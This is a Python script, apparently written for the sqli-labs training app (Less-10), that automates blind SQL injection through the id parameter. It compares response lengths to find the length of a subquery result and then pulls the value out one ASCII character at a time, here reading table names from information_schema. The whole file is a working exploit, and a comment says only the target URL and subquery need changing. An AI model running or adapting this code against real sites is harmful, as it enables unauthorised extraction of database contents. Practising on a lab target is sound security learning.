import requests
def subq_len(url_boom_len_standard, subquery, url_boom_len, headers ):
    response_1 = requests.get(url_boom_len_standard % subquery, headers = headers, timeout = 60)
    for i in range(1, 101):     #假设最长字段名字不超过100
        response = requests.get(url_boom_len % (subquery, i))
        if len(response.content) == len(response_1.content):
            print("查询字段长度为：", i)
            return i
    return 0
def subq_data(url_boom_data_standard, subquery, url_boom_data, headers, data_len):
    str1 = ''
    for i in range(1, data_len+1):
        response_1 = requests.get(url_boom_data_standard % (subquery, i), headers = headers, timeout = 60 )
        for n in range(33, 127):   #搜索ascii的所有可显示字符
            response = requests.get(url_boom_data % (subquery, i, n))
            if len(response.content) == len(response_1.content):
                str1 = str1 + chr(n)
                break
    print('字段值：', str1)
    return str1


if __name__=='__main__':
    init_url = "http://192.168.9.44:8848/Less-10/?id=1\""   #修改初始url和子查询即可
    subquery = "select table_name from information_schema.tables where table_schema=database() limit 3,1"       #修改初始url和子查询即可
    # subquery = "database()"
    headers = {'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:78.0) Gecko/20100101 Firefox/78.0'}
    url_boom_len = init_url + " and if(length((%s))=%s,0,1)--+"
    url_boom_len_standard = init_url + " and if(length((%s))=,0,1)--+"
    url_boom_data = init_url + " and if(ascii(substr((%s),%s,1))=%s,0,1)--+"
    url_boom_data_standard =init_url + " and if(ascii(substr((%s),%s,1))=,0,1)--+"
    data_len = subq_len(url_boom_len_standard, subquery, url_boom_len, headers)
    subq_data(url_boom_data_standard, subquery, url_boom_data, headers, data_len)

